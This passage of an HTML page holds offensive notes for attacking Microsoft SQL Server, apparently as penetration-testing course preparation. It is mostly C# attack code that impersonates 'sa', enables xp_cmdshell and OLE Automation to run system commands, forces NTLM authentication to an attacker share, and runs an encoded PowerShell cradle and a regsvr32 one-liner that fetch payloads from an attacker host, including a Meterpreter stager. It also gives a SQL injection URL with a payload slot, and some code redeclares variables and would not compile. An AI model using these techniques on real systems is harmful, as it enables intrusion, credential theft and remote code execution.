con);<br />            Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[+] Enabled xp_cmdshell&quot;</span>);<br />            result = sqlQuery(<span style="color:#3ad900;font-weight:400">&quot;EXEC xp_cmdshell whoami&quot;</span>, con);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] xp_cmdshell: {result}&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Execute OS commands via Ole Automation Procedures</span><br />            sqlQuery(<span style="color:#3ad900;font-weight:400">&quot;EXECUTE AS LOGIN = &#39;sa&#39;;&quot;</span>, con);<br />            sqlQuery(<span style="color:#3ad900;font-weight:400">&quot;EXEC sp_configure &#39;Ole Automation Procedures&#39;,1; RECONFIGURE; &quot;</span>, con);<br />            sqlQuery(<span style="color:#3ad900;font-weight:400">@&quot;DECLARE @myshell INT; EXEC sp_oacreate &#39;wscript.shell&#39;, @myshell OUTPUT; EXEC sp_oamethod @myshell, &#39;run&#39;, null, &#39;cmd /c echo Test &gt; C:\Windows\Tasks\out.txt&#39;;&quot;</span>, con);<br /><br />            con.Close();<br />        }<br />    }<br />}</pre></div></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><strong><h2>sqli WEB</h2></strong><ul><li><a href="http://192.168.XXX.XXXX/?p=%27%3BEXECUTE+AS+LOGIN+%3D+%27sa%27%3BEXEC+sp_configure+%27show+advanced+options%27%2C+1%3B+RECONFIGURE%3B+EXEC+sp_configure+%27xp_cmdshell%27%2C+1%3B+RECONFIGURE%3BEXEC+xp_cmdshell+%27<PAYLOAD_HERE_WITH_NO_QUOTES>%27--&dst=">http://192.168.XXX.XXXX/?p=%27%3BEXECUTE+AS+LOGIN+%3D+%27sa%27%3BEXEC+sp_configure+%27show+advanced+options%27%2C+1%3B+RECONFIGURE%3B+EXEC+sp_configure+%27xp_cmdshell%27%2C+1%3B+RECONFIGURE%3BEXEC+xp_cmdshell+%27&lt;PAYLOAD_HERE_WITH_NO_QUOTES&gt;%27--&amp;dst=</a></li></ul></p><p></p><p></p><p></p><p><strong><h2>Enable RPCOut when  running xp_cmdshell on linked servers </h2></strong></p><p></p><p><ul><li>• <small>• the created link must be configured with outbound RPC through the RPC Out setting.</small></li><li><small>RPC Out is not a setting that is turned on by default, but is commonly set by system administrators. If RPC Out is not allowed, it can be enabled with the </small><strong><small>sp_serveroption</small></strong><small> stored procedure if our current user has sysadmin role membership.</small></p><p></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Data.SqlClient;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> MSSQL<br />{<br />	<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Program<br />	{<br />		<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> String executeQuery(String query, SqlConnection con)<br />		{<br />			SqlCommand cmd = <span style="color:#ff9d00;font-weight:700">new</span> SqlCommand(query, con);<br />			SqlDataReader reader = cmd.ExecuteReader();<br />			<span style="color:#ff9d00;font-weight:700">try</span><br />			{<br />				String result = <span style="color:#3ad900;font-weight:400">&quot;&quot;</span>;<br />				<span style="color:#ff9d00;font-weight:700">while</span> (reader.Read() == <span style="color:#ff0044;font-weight:400">true</span>)<br />				{<br />					result += reader[<span style="color:#ff0044;font-weight:400">0</span>] + <span style="color:#3ad900;font-weight:400">&quot;\n&quot;</span>;<br />				}<br />				reader.Close();<br />				<span style="color:#ff9d00;font-weight:700">return</span> result;<br />			}<br />			<span style="color:#ff9d00;font-weight:700">catch</span><br />			{<br />				<span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#3ad900;font-weight:400">&quot;&quot;</span>;<br />			}<br />		}<br /><br />		<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> getGroupMembership(String groupToCheck, SqlConnection con)<br />		{<br />			String res = executeQuery($<span style="color:#3ad900;font-weight:400">&quot;SELECT IS_SRVROLEMEMBER(&#39;{groupToCheck}&#39;);&quot;</span>, con);<br />			<span style="color:#7f0044;font-weight:400">int</span> role = <span style="color:#7f0044;font-weight:400">int</span>.Parse(res);<br />			<span style="color:#ff9d00;font-weight:700">if</span> (role == <span style="color:#ff0044;font-weight:400">1</span>)<br />			{<br />				Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[+] User is a member of the &#39;{groupToCheck}&#39; group.&quot;</span>);<br />			}<br />			<span style="color:#ff9d00;font-weight:700">else</span><br />			{<br />				Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[-] User is not a member of the &#39;{groupToCheck}&#39; group.&quot;</span>);<br />			}<br />		}<br /><br />		<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />		{<br />			String serv = <span style="color:#3ad900;font-weight:400">&quot;web06.dev.final.com&quot;</span>;<br />			String db = <span style="color:#3ad900;font-weight:400">&quot;master&quot;</span>;<br />			String conStr = $<span style="color:#3ad900;font-weight:400">&quot;Server = {serv}; Database = {db}; Integrated Security = True;&quot;</span>;<br />			SqlConnection con = <span style="color:#ff9d00;font-weight:700">new</span> SqlConnection(conStr);<br /><br />			<span style="color:#ff9d00;font-weight:700">try</span><br />			{<br />				con.Open();<br />				Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[+] Authenticated to MSSQL Server!&quot;</span>);<br />			}<br />			<span style="color:#ff9d00;font-weight:700">catch</span><br />			{<br />				Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[-] Authentication failed.&quot;</span>);<br />				Environment.Exit(<span style="color:#ff0044;font-weight:400">0</span>);<br />			}<br /><br /><br />			<span style="color:#0088ff;font-weight:400">// Impersonate login and get login information</span><br />	<br />			String res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;EXECUTE AS LOGIN = &#39;sa&#39;;&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Triggered impersonation.&quot;</span>);<br />			<br />	<br />			<span style="color:#0088ff;font-weight:400">// Execute on linked server</span><br />			 res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;EXECUTE as LOGIN = &#39;sa&#39;;EXEC sp_serveroption &#39;SQL03&#39;, &#39;rpc out&#39;, &#39;true&#39;;EXEC (&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;RECONFIGURE;&#39;) AT SQL03;EXEC(&#39;xp_cmdshell &#39;&#39;whoami&#39;&#39;;&#39;) AT SQL03&quot;</span>, con);<br /><br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Triggered command. Result: {res}&quot;</span>);<br />		}<br />	}<br />}</pre></div></p><p></p><p></p><p></p><p><strong><h2>MSSQL OSEP code snippet</h2></strong></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Data.SqlClient;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> MSSQL<br />{<br />	<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Program<br />	{<br />		<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> String executeQuery(String query, SqlConnection con)<br />		{<br />			SqlCommand cmd = <span style="color:#ff9d00;font-weight:700">new</span> SqlCommand(query, con);<br />			SqlDataReader reader = cmd.ExecuteReader();<br />			<span style="color:#ff9d00;font-weight:700">try</span><br />			{<br />				String result = <span style="color:#3ad900;font-weight:400">&quot;&quot;</span>;<br />				<span style="color:#ff9d00;font-weight:700">while</span> (reader.Read() == <span style="color:#ff0044;font-weight:400">true</span>)<br />				{<br />					result += reader[<span style="color:#ff0044;font-weight:400">0</span>] + <span style="color:#3ad900;font-weight:400">&quot;\n&quot;</span>;<br />				}<br />				reader.Close();<br />				<span style="color:#ff9d00;font-weight:700">return</span> result;<br />			}<br />			<span style="color:#ff9d00;font-weight:700">catch</span><br />			{<br />				<span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#3ad900;font-weight:400">&quot;&quot;</span>;<br />			}<br />		}<br /><br />		<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> getGroupMembership(String groupToCheck, SqlConnection con)<br />		{<br />			String res = executeQuery($<span style="color:#3ad900;font-weight:400">&quot;SELECT IS_SRVROLEMEMBER(&#39;{groupToCheck}&#39;);&quot;</span>, con);<br />			<span style="color:#7f0044;font-weight:400">int</span> role = <span style="color:#7f0044;font-weight:400">int</span>.Parse(res);<br />			<span style="color:#ff9d00;font-weight:700">if</span> (role == <span style="color:#ff0044;font-weight:400">1</span>)<br />			{<br />				Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[+] User is a member of the &#39;{groupToCheck}&#39; group.&quot;</span>);<br />			}<br />			<span style="color:#ff9d00;font-weight:700">else</span><br />			{<br />				Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[-] User is not a member of the &#39;{groupToCheck}&#39; group.&quot;</span>);<br />			}<br />		}<br /><br />		<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />		{<br />			String serv = <span style="color:#3ad900;font-weight:400">&quot;dc01.corp1.com&quot;</span>;<br />			String db = <span style="color:#3ad900;font-weight:400">&quot;master&quot;</span>;<br />			String conStr = $<span style="color:#3ad900;font-weight:400">&quot;Server = {serv}; Database = {db}; Integrated Security = True;&quot;</span>;<br />			SqlConnection con = <span style="color:#ff9d00;font-weight:700">new</span> SqlConnection(conStr);<br /><br />			<span style="color:#ff9d00;font-weight:700">try</span><br />			{<br />				con.Open();<br />				Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[+] Authenticated to MSSQL Server!&quot;</span>);<br />			}<br />			<span style="color:#ff9d00;font-weight:700">catch</span><br />			{<br />				Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[-] Authentication failed.&quot;</span>);<br />				Environment.Exit(<span style="color:#ff0044;font-weight:400">0</span>);<br />			}<br /><br />			<span style="color:#0088ff;font-weight:400">// Enumerate login info</span><br />			String login = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;SELECT SYSTEM_USER;&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Logged in as: {login}&quot;</span>);<br />			String uname = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;SELECT USER_NAME();&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Database username: {uname}&quot;</span>);<br />			getGroupMembership(<span style="color:#3ad900;font-weight:400">&quot;public&quot;</span>, con);<br />			getGroupMembership(<span style="color:#3ad900;font-weight:400">&quot;sysadmin&quot;</span>, con);<br /><br />			<span style="color:#0088ff;font-weight:400">// Force NTLM authentication for hash-grabbing or relaying</span><br />			String targetShare = <span style="color:#3ad900;font-weight:400">&quot;\\\\192.168.49.67\\share&quot;</span>;<br />			String res = executeQuery($<span style="color:#3ad900;font-weight:400">&quot;EXEC master..xp_dirtree \&quot;{targetShare}\&quot;;&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Forced authentication to &#39;{targetShare}&#39;.&quot;</span>);<br /><br />			<span style="color:#0088ff;font-weight:400">// Get logins that we can impersonate</span><br />			String res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39;; &quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] User can impersonate the following logins: {res}.&quot;</span>);<br /><br />			<span style="color:#0088ff;font-weight:400">// Impersonate login and get login information</span><br />			String su = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;SELECT SYSTEM_USER;&quot;</span>, con);<br />			String un = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;SELECT USER_NAME();&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Current database login is &#39;{su}&#39; with system user &#39;{un}&#39;.&quot;</span>);<br />			String res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;EXECUTE AS LOGIN = &#39;sa&#39;;&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Triggered impersonation.&quot;</span>);<br />			su = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;SELECT SYSTEM_USER;&quot;</span>, con);<br />			un = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;SELECT USER_NAME();&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Current database login is &#39;{su}&#39; with system user &#39;{un}&#39;.&quot;</span>);<br /><br />			<span style="color:#0088ff;font-weight:400">// Impersonate dbo in trusted database and execute through &#39;xp_cmdshell&#39;</span><br />			String res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;use msdb; EXECUTE AS USER = &#39;dbo&#39;;&quot;</span>, con);<br />			Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[*] Triggered impersonation.&quot;</span>);<br />			res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE;&quot;</span>, con);<br />			Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[*] Enabled &#39;xp_cmdshell&#39;.&quot;</span>);<br />			String cmd = <span style="color:#3ad900;font-weight:400">&quot;powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA2ADcALwBjAGgAYQBwAHQAZQByADcALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=&quot;</span>;<br />			res = executeQuery($<span style="color:#3ad900;font-weight:400">&quot;EXEC xp_cmdshell &#39;{cmd}&#39;&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Executed command! Result: {res}&quot;</span>);<br /><br />			<span style="color:#0088ff;font-weight:400">// Impersonate dbo in trusted database and execute through &#39;sp_OACreate&#39; </span><br />			String res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;use msdb; EXECUTE AS USER = &#39;dbo&#39;;&quot;</span>, con);<br />			Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[*] Triggered impersonation.&quot;</span>);<br />			res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1; RECONFIGURE;&quot;</span>, con);<br />			Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[*] Enabled OLE automation procedures.&quot;</span>);<br />			String cmd = <span style="color:#3ad900;font-weight:400">&quot;powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA2ADcALwBjAGgAYQBwAHQAZQByADcALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=&quot;</span>;<br />			res = executeQuery($<span style="color:#3ad900;font-weight:400">&quot;DECLARE @myshell INT; EXEC sp_oacreate &#39;wscript.shell&#39;, @myshell OUTPUT; EXEC sp_oamethod @myshell, &#39;run&#39;, null, &#39;{cmd}&#39;;&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Executed command!&quot;</span>);<br /><br />			<span style="color:#0088ff;font-weight:400">//</span><br />			<span style="color:#0088ff;font-weight:400">// Execution via loading custom assemblies is also possible, but for brevity not included here</span><br />			<span style="color:#0088ff;font-weight:400">//</span><br /><br />			<span style="color:#0088ff;font-weight:400">// Enumerate linked servers</span><br />			String res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;EXEC sp_linkedservers;&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Found linked servers: {res}&quot;</span>);<br /><br />			<span style="color:#0088ff;font-weight:400">// Execute on linked server</span><br />			String res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;EXEC (&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure;&#39;) AT DC01;&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Enabled advanced options on DC01.&quot;</span>);<br />			res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;EXEC (&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; reconfigure;&#39;) AT DC01;&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Enabled xp_cmdshell option on DC01.&quot;</span>);<br />			res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;EXEC (&#39;xp_cmdshell &#39;&#39;whoami&#39;&#39;;&#39;) AT DC01;&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Triggered command. Result: {res}&quot;</span>);<br /><br />			<span style="color:#0088ff;font-weight:400">// Execute on linked server via &#39;openquery&#39;</span><br />			String res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;select 1 from openquery(\&quot;dc01\&quot;, &#39;select 1; EXEC sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure&#39;)&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Enabled advanced options on DC01.&quot;</span>);<br />			res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;select 1 from openquery(\&quot;dc01\&quot;, &#39;select 1; EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; reconfigure&#39;)&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Enabled xp_cmdshell options on DC01.&quot;</span>);<br />			res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;select 1 from openquery(\&quot;dc01\&quot;, &#39;select 1; exec xp_cmdshell &#39;&#39;regsvr32 /s /n /u /i:http://192.168.49.67:8080/F0t6R5A.sct scrobj.dll&#39;&#39;&#39;)&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Triggered Meterpreter oneliner on DC01. Check your listener!&quot;</span>);<br /><br />			<span style="color:#0088ff;font-weight:400">// Escalate via double database linkedString su = executeQuery(&quot;SELECT SYSTEM_USER;&quot;, con);</span><br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Current system user is &#39;{su}&#39; in database &#39;appsrv01&#39;.&quot;</span>);<br />			su = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;select mylogin from openquery(\&quot;dc01\&quot;, &#39;select SYSTEM_USER as mylogin&#39;);&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Current system user is &#39;{su}&#39; in database &#39;dc01&#39; via 1 link.&quot;</span>);<br />			su = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;select mylogin from openquery(\&quot;dc01\&quot;, &#39;select mylogin from openquery(\&quot;appsrv01\&quot;, &#39;&#39;select SYSTEM_USER as mylogin&#39;&#39;)&#39;);&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Current system user is &#39;{su}&#39; in database &#39;appsrv01&#39; via 2 links.&quot;</span>);<br />		}<br />	}<br />}</pre></div> 	</p></div>
</body>
</html>
